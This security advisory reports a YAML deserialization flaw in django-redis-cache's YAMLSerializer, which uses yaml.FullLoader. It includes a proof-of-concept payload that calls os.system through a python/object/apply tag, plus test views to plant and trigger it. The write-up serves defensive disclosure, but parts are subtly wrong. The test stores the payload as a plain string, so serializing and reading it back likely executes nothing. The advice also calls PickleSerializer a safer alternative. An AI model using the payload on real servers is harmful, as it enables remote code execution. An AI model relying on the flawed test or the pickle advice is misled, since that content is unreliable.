- Vulnerability name: YAML Deserialization leading to Arbitrary Code Execution
- Description:
    - An attacker can exploit a YAML deserialization vulnerability if the application is configured to use the `YAMLSerializer`.
    - The vulnerability occurs because the `YAMLSerializer` in `redis_cache/serializers.py` uses `yaml.FullLoader` when deserializing YAML data. `FullLoader` is known to be unsafe and can execute arbitrary code if the YAML data contains malicious payloads.
    - An attacker can inject a malicious YAML payload into the cache. This could be achieved if the application caches user-controlled data or if there is another vulnerability that allows cache poisoning.
    - When the application retrieves and deserializes this malicious YAML data from the cache, it can lead to arbitrary code execution on the server.

- Impact:
    - Critical.
    - Successful exploitation allows an external attacker to achieve arbitrary code execution on the server hosting the Django application.
    - This can lead to complete compromise of the server and the application, including data theft, data manipulation, and further attacks on internal systems.

- Vulnerability rank: critical

- Currently implemented mitigations:
    - None. The code in `redis_cache/serializers.py` directly uses `yaml.FullLoader` without any safeguards.

- Missing mitigations:
    - The `YAMLSerializer` should be changed to use `yaml.SafeLoader` instead of `yaml.FullLoader`. `SafeLoader` is designed to prevent the deserialization of unsafe YAML constructs that can lead to code execution.
    - Alternatively, the documentation should strongly warn against using `YAMLSerializer` in production environments, especially when caching potentially untrusted data, and recommend using safer serializers like `JSONSerializer` or `PickleSerializer` with appropriate security considerations.

- Preconditions:
    - The Django application must be configured to use `redis_cache.serializers.YAMLSerializer` for caching. This is configured via the `CACHES` setting in Django's `settings.py`.
    - An attacker must be able to influence or control the data that gets stored in the cache. This could happen if the application directly or indirectly caches user inputs, or if there is another vulnerability that allows cache poisoning.

- Source code analysis:
    - File: `/code/redis_cache/serializers.py`
    - Class: `YAMLSerializer`
    - Method: `deserialize(self, value)`

    ```python
    # /code/redis_cache/serializers.py
    class YAMLSerializer(BaseSerializer):
        def serialize(self, value):
            return yaml.dump(value, encoding='utf-8', Dumper=yaml.Dumper)

        def deserialize(self, value):
            return yaml.load(value, Loader=yaml.FullLoader) # Vulnerable line
    ```

    - The `deserialize` method of the `YAMLSerializer` class uses `yaml.load(value, Loader=yaml.FullLoader)`.
    - `yaml.FullLoader` in `PyYAML` is known to be vulnerable to arbitrary code execution because it allows deserialization of arbitrary Python objects from the YAML stream, including those that can execute code upon instantiation.
    - If an attacker can inject a specially crafted YAML payload into the cache and the application later deserializes this data using `YAMLSerializer`, the malicious YAML can trigger arbitrary code execution on the server.

- Security test case:
    1. Modify the test settings file (`/code/tests/settings.py`) to configure the default cache to use `YAMLSerializer`:
        ```python
        CACHES = {
            'default': {
                'BACKEND': 'redis_cache.RedisCache',
                'LOCATION': '127.0.0.1:6381',
                'OPTIONS': {
                    'DB': 15,
                    'PASSWORD': 'yadayada',
                    'PARSER_CLASS': 'redis.connection.HiredisParser',
                    'PICKLE_VERSION': 2,
                    'SERIALIZER_CLASS': 'redis_cache.serializers.YAMLSerializer', # Use YAMLSerializer
                    'CONNECTION_POOL_CLASS': 'redis.ConnectionPool',
                    'CONNECTION_POOL_CLASS_KWARGS': {
                        'max_connections': 2,
                    }
                },
            },
        }
        ```
    2. Create a new test view in `/code/tests/views.py` to set and retrieve a malicious YAML payload in the cache:
        ```python
        # /code/tests/views.py
        from django.core.cache import caches
        from django.http import HttpResponse
        import os

        def set_malicious_yaml(request):
            cache = caches['default']
            malicious_yaml = """
            !!python/object/apply:os.system ["touch /tmp/pwned"]
            """
            cache.set("yaml_payload", malicious_yaml)
            return HttpResponse("Malicious YAML payload set in cache")

        def get_cached_data(request):
            cache = caches['default']
            data = cache.get("yaml_payload")
            return HttpResponse(f"Retrieved data from cache: {data}")
        ```
    3. Add these views to the test URLs in `/code/tests/urls.py`:
        ```python
        # /code/tests/urls.py
        from django.conf.urls.defaults import *
        from tests.views import set_malicious_yaml, get_cached_data


        urlpatterns = patterns('',
            (r'^set_yaml/$', set_malicious_yaml),
            (r'^get_data/$', get_cached_data),
        )
        ```
    4. Run the Django test server (e.g., using `./tests/runtests.py`).
    5. Access the `set_yaml/` URL in a browser or using `curl` (e.g., `http://127.0.0.1:8000/set_yaml/`). This will set the malicious YAML payload in the cache.
    6. Access the `get_data/` URL (e.g., `http://127.0.0.1:8000/get_data/`). This will retrieve and deserialize the YAML data from the cache.
    7. Check if the file `/tmp/pwned` has been created on the server. If the file exists, it confirms that the malicious YAML payload was executed, demonstrating arbitrary code execution vulnerability.

    **Expected result:** After performing the test case steps, the file `/tmp/pwned` should be created, indicating successful arbitrary code execution due to YAML deserialization vulnerability.